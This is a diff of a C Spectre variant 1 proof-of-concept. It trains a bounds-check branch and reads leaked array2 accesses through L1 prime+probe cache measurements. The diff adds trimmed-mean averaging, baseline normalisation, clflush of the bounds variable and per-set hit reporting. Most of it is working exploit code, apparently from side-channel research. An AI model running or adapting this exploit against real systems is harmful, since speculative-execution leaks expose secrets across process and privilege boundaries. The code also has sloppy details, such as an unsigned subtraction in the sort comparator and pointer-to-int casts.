@@ -8,16 +8,20 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <cachesc.h>
+#include <math.h>
 
 
 // Pin process to a CPU. To reduce noise, this CPU can be isolated.
-#define CPU_NUMBER 1
-#define CACHE_HIT_THRESHOLD (120)  /* assume cache hit if time <= threshold */
+#define CPU_NUMBER 3
+#define CACHE_HIT_THRESHOLD (5)  /* assume cache hit if time <= threshold */
 
 #define TARGET_CACHE L1
 #define MSRMTS_PER_SAMPLE L1_SETS
 #define PRIME prime
 
+#define TRIM_HIGH 0.05
+#define TRIM_LOW 0
+#define TRIM_HIGH_PERCENTAGE 0.05
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
@@ -34,9 +38,38 @@ void victim_function(size_t x) {
 	}
 }
 
+uint32_t cmpfunc (const void * a, const void * b) {
+   return ( *(uint32_t*)a - *(uint32_t*)b );
+}
+void copy_results_to_array(uint32_t *res, double* array ,uint32_t sample_cnt, uint32_t sets_per_sample)
+{
+        // printf("sam %d \n", sample_cnt);
+        // printf(" out %d \n",  );
+    for (uint32_t j = 0; j < sets_per_sample; ++j)
+    {   
+
+        uint32_t temp_array[sample_cnt];
+        for (uint32_t i = 0; i < sample_cnt; ++i) 
+        {
+
+            temp_array[i] = res[i * sets_per_sample + j];
+            
+
+        }
+        qsort(temp_array, sample_cnt, sizeof(uint32_t), cmpfunc);
+
+        
+        for(int i = 0; i < (int)round((1-TRIM_HIGH_PERCENTAGE)*sample_cnt); i++)
+        {   
+    
+            array[j] += (temp_array[i] - array[j])/(i+1);
+        }
+
+    }
+}
 
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-	int sample_cnt = 1000;
+	int sample_cnt = 100;
 	static int results[256];
 	int tries, i, j, k, mix_i, junk = 0;
 	size_t training_x, x;
@@ -66,31 +99,35 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     prepare_measurement();
 
 
-    // /*
-    //  * Make baseline measurements for normalisation (optional)
-    //  */
-    // #ifdef NORMALIZE
-    // for (i = 0; i < sample_cnt; ++i) {
-    //     curr_head = PRIME(curr_head);
-    //     next_head = probe(TARGET_CACHE, curr_head);
+    /*
+     * Make baseline measurements for normalisation (optional)
+     */
+    #ifdef NORMALIZE
+    double *baseline = NULL;
+    for (i = 0; i < sample_cnt; ++i) {
+        curr_head = PRIME(curr_head);
+        next_head = probe(TARGET_CACHE, curr_head);
 
-    //     get_msrmts_for_all_set(curr_head, curr_res);
-    //     curr_head = next_head;
-    //     curr_res += MSRMTS_PER_SAMPLE;
-    // }
+        get_msrmts_for_all_set(curr_head, curr_res);
+        curr_head = next_head;
+        curr_res += MSRMTS_PER_SAMPLE;
+    }
 
     // PRINT_LINE("Output cache set access baseline data\n");
     // print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);
 
+    baseline = (double *)malloc(MSRMTS_PER_SAMPLE * sizeof(double));
+    memset(baseline, 0, MSRMTS_PER_SAMPLE * sizeof(double));
+    copy_results_to_array(res, baseline ,sample_cnt, MSRMTS_PER_SAMPLE);
     // // reset changes
-    // memset(res, 0, res_size);
-    // curr_res    = res;
-    // curr_head   = cache_ds;
-    // #endif
+    memset(res, 0, res_size);
+    curr_res    = res;
+    curr_head   = cache_ds;
+    #endif
 
-    PRINT_LINE("Initial attacker preparation\n");
-    PRINT_LINE("Number of samples: %d\n", sample_cnt);
-    PRINT_LINE("Measurements per sample: %d\n", MSRMTS_PER_SAMPLE);
+    // PRINT_LINE("Initial attacker preparation\n");
+    // PRINT_LINE("Number of samples: %d\n", sample_cnt);
+    // PRINT_LINE("Measurements per sample: %d\n", MSRMTS_PER_SAMPLE);
 
     /*
      * Start attacking for "sample_cnt" rounds
@@ -108,7 +145,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 		training_x = 0;
 	// fprintf(stderr,"The target is: %d\n",((long long)(&array2[array1[training_x]*64])>>6)&0b111111);
 		for (register int jl = 3; jl >= 0; jl--) {
-			// _mm_clflush(&array1_size);
+			_mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -128,32 +165,29 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         get_msrmts_for_all_set(curr_head, curr_res);
         curr_head = next_head;
         curr_res += MSRMTS_PER_SAMPLE;
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		// for (i = 0; i < 256; i++) {
-		// 	mix_i = ((i * 167) + 13) & 255;
-		// 	addr = &array2[mix_i * 512];
-		// 	time1 = __rdtscp(&junk);            /* READ TIMER */
-		// 	junk = *addr;                       /* MEMORY ACCESS TO TIME */
-		// 	time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
-		// 	if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-		// 		results[mix_i]++;  /* cache hit - add +1 to score for this value */
-		// }
-
-		// /* Locate highest & second-highest results results tallies in j/k */
-		// j = k = -1;
-		// for (i = 0; i < 256; i++) {
-		// 	if (j < 0 || results[i] >= results[j]) {
-		// 		k = j;
-		// 		j = i;
-		// 	} else if (k < 0 || results[i] >= results[k]) {
-		// 		k = i;
-		// 	}
-		// }
-		// if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-		// 	break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
-    PRINT_LINE("Output cache attack data\n");
-    print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);
+    // PRINT_LINE("Output cache attack data\n");
+    // print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);
+    double* avg = (double*)malloc(sizeof(double)*MSRMTS_PER_SAMPLE);
+    memset(avg, 0, MSRMTS_PER_SAMPLE * sizeof(double));
+    copy_results_to_array(res, avg ,sample_cnt, MSRMTS_PER_SAMPLE);
+    #ifdef NORMALIZE
+        for (int i = 0; i < MSRMTS_PER_SAMPLE; i++)
+        {
+            avg[i] -= baseline[i];
+        }
+    #endif
+	
+		// for(int i=0;i<MSRMTS_PER_SAMPLE;i++){
+		// 	printf("%d:%f ",i,avg[i]);
+		// }
+		// printf("\n");
+		for(int i=0;i<MSRMTS_PER_SAMPLE;i++){
+			if(avg[i] > CACHE_HIT_THRESHOLD){
+				printf("%d ",i);
+			}
+		}
+		printf("\n");
 	// results[0] ^= junk;  /* use junk so code above won't get optimized out*/
 	// value[0] = (uint8_t)j;
 	// score[0] = results[j];
@@ -174,11 +208,14 @@ int main(int argc, const char **argv) {
 		sscanf(argv[2], "%d", &len);
 	}
 
+	len = 5;
 	printf("Reading %d bytes:\n", len);
-	len = 1;
-	fprintf(stderr,"The target is: %p\n",&array2[array1[malicious_x]*64]);
-	fprintf(stderr,"The target is: %d\n",((int)(&array2[array1[malicious_x]*64])>>6)&0b111111);
+	printf("k in below output represents array2 + array1[malicious_x]\n");
+	printf("Target set in output below is defined as (k>>6)&0b111111\n");
+	printf("The value of array2 is: %p\n",array2);
 	while (--len >= 0) {
+		fprintf(stderr,"The value of k: %p\t",&array2[array1[malicious_x]*64]);
+		fprintf(stderr,"The target set is: %d\t\tThe sets accessed: ",((int)(&array2[array1[malicious_x]*64])>>6)&0b111111);
 		// printf("Reading at malicious_x = %p... ", (void*)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 		// printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
